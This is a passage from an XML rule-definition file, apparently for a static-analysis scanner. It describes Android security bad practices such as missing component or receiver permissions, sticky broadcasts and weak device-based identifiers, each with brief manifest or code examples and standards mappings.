							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A2 Broken Access Control</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A6 Security Misconfiguration</em> <br></p>
																									   <p>[4] Standards Mapping - FIPS200 - (FISMA) <em>AC</em> <br></p>
																									   <p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>AC-4 Information Flow Enforcement (P1)</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3480.1 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3480.1 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3480.1 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3480.1 CAT I</em> <br></p>
																									   <p>[10] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3480.1 CAT II</em> <br></p>
																									   <p>[11] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 265</em> <br></p>
																									   <p>[12] Jesse Burns <em>Developing Secure Mobile Applications for Android</em> <br></p>
																									   <p>[13] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Improper Access Control - CWE ID 285</em> <br></p>
																									   <p>[14] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M5 Poor Authorization and Authentication</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.10</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.5</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.5.6, Requirement 7.1.1</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 7.1.2</em> <br></p>
																									   <p>[19] William Enck, Machigar Ongtang, and Patrick McDaniel <em>Understanding Android Security</em> <br></p>
																									   <p>[20] William Enck and Patrick McDaniel <em>Understanding Android's Security Framework</em> <br></p>
																									   <p>[21]  <em>Using Permissions</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>security-features</tag>
	</rule>
	<rule>
		<key>security_features_android_bad_practices_missing_component_permission
		</key>
		<internalKey>Security Features/Android Bad Practices/Missing Component
			Permission
		</internalKey>
		<name>Android Bad Practices: Missing Component Permission</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The program does not explicitly assign an access permission to this public component.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Any application can access public components that are not explicitly assigned an access permission in their manifest definition.<br><br>The default value of the <code>exported</code> attribute for the activity, receiver and service components in an Android application depends on the presence or absence of an <code>intent-filter</code>. Presence of an <code>intent-filter</code> implies, the component is intended for external use, thus setting the <code>exported</code> attribute to true. This component is now accessible to any other applications on the Android platform.<br><br><b>Example 1:</b> Below is an example of an Android activity with an <code>intent-filter</code> and no explicit access permission set.<br><br><pre> &lt;activity android:name=".AndroidActivity"/&gt; </pre><br><pre>   &lt;intent-filter android:label="activityName"/&gt; </pre><br><pre>    &lt;action android:name=".someFunAction"/&gt; </pre><br><pre>   &lt;/intent-filter&gt; </pre><br><pre>    ... </pre><br><pre> &lt;/activity&gt; </pre><br><br>This activity can be exploited by malicious applications.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A2 Broken Access Control</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A6 Security Misconfiguration</em> <br></p>
																									   <p>[4] Standards Mapping - FIPS200 - (FISMA) <em>AC</em> <br></p>
																									   <p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>AC-3 Access Enforcement (P1)</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3480.1 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3480.1 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3480.1 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3480.1 CAT I</em> <br></p>
																									   <p>[10] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3480.1 CAT II</em> <br></p>
																									   <p>[11] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 265</em> <br></p>
																									   <p>[12] Jesse Burns <em>Developing Secure Mobile Applications for Android</em> <br></p>
																									   <p>[13] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Improper Access Control - CWE ID 285</em> <br></p>
																									   <p>[14] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M5 Poor Authorization and Authentication</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.10</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 7.1.1</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 7.1.2</em> <br></p>
																									   <p>[18]  <em>The AndroidManifest.xml File</em> <br></p>
																									   <p>[19] William Enck, Machigar Ongtang, and Patrick McDaniel <em>Understanding Android Security</em> <br></p>
																									   <p>[20] William Enck and Patrick McDaniel <em>Understanding Android's Security Framework</em> <br></p>
																									   <p>[21]  <em>Using Permissions</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>security-features</tag>
	</rule>
	<rule>
		<key>security_features_android_bad_practices_missing_receiver_permission
		</key>
		<internalKey>Security Features/Android Bad Practices/Missing Receiver
			Permission
		</internalKey>
		<name>Android Bad Practices: Missing Receiver Permission</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The program sends a broadcast without specifying the receiver permission.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Broadcasts sent without the receiver permission are accessible to any receiver. If these broadcasts contain sensitive data or reach a malicious receiver, the application may be compromised.<br><br><b>Example 1:</b> The following code sends a broadcast without specifying the receiver permission.<br><pre><br>...<br>context.sendBroadcast(intent);<br>...<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A2 Broken Access Control</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A6 Security Misconfiguration</em> <br></p>
																									   <p>[4] Standards Mapping - FIPS200 - (FISMA) <em>AC</em> <br></p>
																									   <p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>AC-4 Information Flow Enforcement (P1)</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3480.1 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3480.1 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3480.1 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3480.1 CAT I</em> <br></p>
																									   <p>[10] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3480.1 CAT II</em> <br></p>
																									   <p>[11] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 265</em> <br></p>
																									   <p>[12] Jesse Burns <em>Developing Secure Mobile Applications for Android</em> <br></p>
																									   <p>[13] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Improper Access Control - CWE ID 285</em> <br></p>
																									   <p>[14] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M5 Poor Authorization and Authentication</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.10</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.5</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.5.6, Requirement 7.1.1</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 7.1.2</em> <br></p>
																									   <p>[19] William Enck, Machigar Ongtang, and Patrick McDaniel <em>Understanding Android Security</em> <br></p>
																									   <p>[20] William Enck and Patrick McDaniel <em>Understanding Android's Security Framework</em> <br></p>
																									   <p>[21]  <em>Using Permissions</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>security-features</tag>
	</rule>
	<rule>
		<key>security_features_android_bad_practices_missing_exported_flag_or_component_permission
		</key>
		<internalKey>Security Features/Android Bad Practices/Missing exported
			Flag or Component Permission
		</internalKey>
		<name>Android Bad Practices: Missing exported Flag or Component
			Permission
		</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The program does not explicitly assign an access permission to a component.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Any application can access public components that are not explicitly assigned an access permission in their manifest definition.  Android content provider are exported by default for applications that set either android:minSdkVersion or android:targetSdkVersion to "16" or lower. For applications that set either of these attributes to "17" or higher, the default is "false".<br><br><b>Example 1:</b> Below is an example of an Android content provider declared without an explicit access permission or exported flag.<br><br><pre> &lt;provider android:name=".ContentProvider"/&gt; </pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A2 Broken Access Control</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A6 Security Misconfiguration</em> <br></p>
																									   <p>[4] Standards Mapping - FIPS200 - (FISMA) <em>AC</em> <br></p>
																									   <p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>AC-3 Access Enforcement (P1)</em> <br></p>
																									   <p>[6] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 265</em> <br></p>
																									   <p>[7] Jesse Burns <em>Developing Secure Mobile Applications for Android</em> <br></p>
																									   <p>[8] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Improper Access Control - CWE ID 285</em> <br></p>
																									   <p>[9] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M5 Poor Authorization and Authentication</em> <br></p>
																									   <p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.10</em> <br></p>
																									   <p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 7.1.1</em> <br></p>
																									   <p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 7.1.2</em> <br></p>
																									   <p>[13]  <em>The AndroidManifest.xml File</em> <br></p>
																									   <p>[14] William Enck, Machigar Ongtang, and Patrick McDaniel <em>Understanding Android Security</em> <br></p>
																									   <p>[15] William Enck and Patrick McDaniel <em>Understanding Android's Security Framework</em> <br></p>
																									   <p>[16]  <em>Using Permissions</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>security-features</tag>
	</rule>
	<rule>
		<key>security_features_android_bad_practices_mixed_component_functionality
		</key>
		<internalKey>Security Features/Android Bad Practices/Mixed Component
			Functionality
		</internalKey>
		<name>Android Bad Practices: Mixed Component Functionality</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  This receiver component is registered to receive messages from the system and also other components.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  System broadcasts can be sent to private components.  Components need to be public to receive non-system broadcasts from third-parties.  By registering to receive both system and non-system broadcasts in a single component, some of the functionality of the component (the system portion) is unnecessarily exposed to third parties.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A2 Broken Access Control</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A6 Security Misconfiguration</em> <br></p>
																									   <p>[4] Standards Mapping - FIPS200 - (FISMA) <em>AC</em> <br></p>
																									   <p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>AC-4 Information Flow Enforcement (P1)</em> <br></p>
																									   <p>[6] E. Chin, A. P. Felt, K. Greenwood, and D. Wagner <em>Analyzing Inter-Application Communication in Android</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3480.2 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3480.2 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3480.2 CAT II</em> <br></p>
																									   <p>[10] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3480.2 CAT II</em> <br></p>
																									   <p>[11] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3480.2 CAT II</em> <br></p>
																									   <p>[12] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 265</em> <br></p>
																									   <p>[13] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Improper Access Control - CWE ID 285</em> <br></p>
																									   <p>[14] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M5 Poor Authorization and Authentication</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.10</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 7.1.1</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 7.1.2</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>security-features</tag>
	</rule>
	<rule>
		<key>security_features_android_bad_practices_provider_permission_defined
		</key>
		<internalKey>Security Features/Android Bad Practices/Provider
			Permission Defined
		</internalKey>
		<name>Android Bad Practices: Provider Permission Defined</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The program declares a content provider with the combined read and write access <code>permission</code>.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  A content provider declared with the combined read and write <code>permission</code> will be accessible to the entities that request either read or write access to the provider. However, in many cases, just like in the case of files on a file system, entities that need read access to the data stored by the provider should not be allowed to modify the data. Setting the <code>permission</code> attribute does not allow to distinguish between data users and interactions that affect the data's integrity.<br><br><b>Example 1:</b> Below is an example of a content provider declared with the combined read and write access <code>permission</code>.<br><br><pre> &lt;provider android:name=".ContentProvider" android:permission="content.permission.READ_AND_WRITE_CONTENT"/&gt; </pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A2 Broken Access Control</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A6 Security Misconfiguration</em> <br></p>
																									   <p>[4] Standards Mapping - FIPS200 - (FISMA) <em>AC</em> <br></p>
																									   <p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>AC-3 Access Enforcement (P1)</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3480.2 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3480.2 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3480.2 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3480.2 CAT II</em> <br></p>
																									   <p>[10] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3480.2 CAT II</em> <br></p>
																									   <p>[11] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 265</em> <br></p>
																									   <p>[12] Jesse Burns <em>Developing Secure Mobile Applications for Android</em> <br></p>
																									   <p>[13] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Improper Access Control - CWE ID 285</em> <br></p>
																									   <p>[14] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M5 Poor Authorization and Authentication</em> <br></p>
																									   <p>[15]  <em>Path Permission Element</em> <br></p>
																									   <p>[16]  <em>Provider Element</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.10</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 7.1.1</em> <br></p>
																									   <p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 7.1.2</em> <br></p>
																									   <p>[20] William Enck, Machigar Ongtang, and Patrick McDaniel <em>Understanding Android Security</em> <br></p>
																									   <p>[21] William Enck and Patrick McDaniel <em>Understanding Android's Security Framework</em> <br></p>
																									   <p>[22]  <em>Using Permissions</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>security-features</tag>
	</rule>
	<rule>
		<key>security_features_android_bad_practices_sticky_broadcast</key>
		<internalKey>Security Features/Android Bad Practices/Sticky Broadcast
		</internalKey>
		<name>Android Bad Practices: Sticky Broadcast</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The program sends a sticky broadcast.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Sticky broadcasts cannot be secured with a permission and therefore are accessible to any receiver. If these broadcasts contain sensitive data or reach a malicious receiver, the application may be compromised.<br><br><b>Example 1:</b> The following code sends a sticky broadcast.<br><pre><br>...<br>context.sendStickyBroadcast(intent);<br>...<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A2 Broken Access Control</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A6 Security Misconfiguration</em> <br></p>
																									   <p>[4] Standards Mapping - FIPS200 - (FISMA) <em>AC</em> <br></p>
																									   <p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>AC-4 Information Flow Enforcement (P1)</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3480.1 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3480.1 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3480.1 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3480.1 CAT I</em> <br></p>
																									   <p>[10] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3480.1 CAT II</em> <br></p>
																									   <p>[11] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 265</em> <br></p>
																									   <p>[12] Jesse Burns <em>Developing Secure Mobile Applications for Android</em> <br></p>
																									   <p>[13] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Improper Access Control - CWE ID 285</em> <br></p>
																									   <p>[14] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M5 Poor Authorization and Authentication</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.10</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.5</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.5.6, Requirement 7.1.1</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 7.1.2</em> <br></p>
																									   <p>[19] William Enck, Machigar Ongtang, and Patrick McDaniel <em>Understanding Android Security</em> <br></p>
																									   <p>[20] William Enck and Patrick McDaniel <em>Understanding Android's Security Framework</em> <br></p>
																									   <p>[21]  <em>Using Permissions</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>security-features</tag>
	</rule>
	<rule>
		<key>security_features_android_bad_practices_system_permission_defined
		</key>
		<internalKey>Security Features/Android Bad Practices/System Permission
			Defined
		</internalKey>
		<name>Android Bad Practices: System Permission Defined</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The program defines a new permission on the <code>android.permission</code> namespace.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Defining new permissions on the <code>android.permission</code> namespace can have unexpected consequences when the OS is updated. If the newer version of the OS defines the exact same permission, the Android Package Management Service (PMS) will silently grant the permission to the app without asking the user allowing privilege escalation attacks.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A2 Broken Access Control</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A6 Security Misconfiguration</em> <br></p>
																									   <p>[4] Standards Mapping - FIPS200 - (FISMA) <em>AC</em> <br></p>
																									   <p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>AC-3 Access Enforcement (P1)</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3480.2 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3480.2 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3480.2 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3480.2 CAT II</em> <br></p>
																									   <p>[10] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3480.2 CAT II</em> <br></p>
																									   <p>[11] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 265</em> <br></p>
																									   <p>[12] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Improper Access Control - CWE ID 285</em> <br></p>
																									   <p>[13] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M5 Poor Authorization and Authentication</em> <br></p>
																									   <p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.10</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 7.1.1</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 7.1.2</em> <br></p>
																									   <p>[17] Luyi Xing, Xiaorui Pan, Rui Wang, Kan Yuan and XiaoFeng Wang <em>Upgrading Your Android, Elevating My Malware: Privilege Escalation Through Mobile OS Updating</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>security-features</tag>
	</rule>
	<rule>
		<key>security_features_android_bad_practices_unnecessary_component_exposure
		</key>
		<internalKey>Security Features/Android Bad Practices/Unnecessary
			Component Exposure
		</internalKey>
		<name>Android Bad Practices: Unnecessary Component Exposure</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  This receiver component is  unnecessarily accessible to third-party components increasing the risk of malicious information injection.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  As this component only expects to receive broadcast messages from the system and not other components, it should be private (inaccessible to other components.)
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A2 Broken Access Control</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A6 Security Misconfiguration</em> <br></p>
																									   <p>[4] Standards Mapping - FIPS200 - (FISMA) <em>AC</em> <br></p>
																									   <p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>AC-4 Information Flow Enforcement (P1)</em> <br></p>
																									   <p>[6] E. Chin, A. P. Felt, K. Greenwood, and D. Wagner <em>Analyzing Inter-Application Communication in Android</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3480.1 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3480.1 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3480.1 CAT I</em> <br></p>
																									   <p>[10] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3480.1 CAT I</em> <br></p>
																									   <p>[11] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3480.1 CAT II</em> <br></p>
																									   <p>[12] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 265</em> <br></p>
																									   <p>[13] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Improper Access Control - CWE ID 285</em> <br></p>
																									   <p>[14] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M5 Poor Authorization and Authentication</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.10</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 7.1.1</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 7.1.2</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>security-features</tag>
	</rule>
	<rule>
		<key>security_features_android_bad_practices_weak_authentication</key>
		<internalKey>Security Features/Android Bad Practices/Weak
			Authentication
		</internalKey>
		<name>Android Bad Practices: Weak Authentication</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The program uses private and/or device specific information to generate a universally unique identifier.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Hardware and device specific identifiers persist across data wipes and factory resets.  One should not rely on these to generate unique identifiers that are used to authorize or authenticate users.<br><br>Moreover, leakage of universally unique identifiers, that can be associated with personal information, pose a threat to user privacy and security.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A10 Insecure Configuration Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A9 Insecure Communications</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A9 Insufficient Transport Layer Protection</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
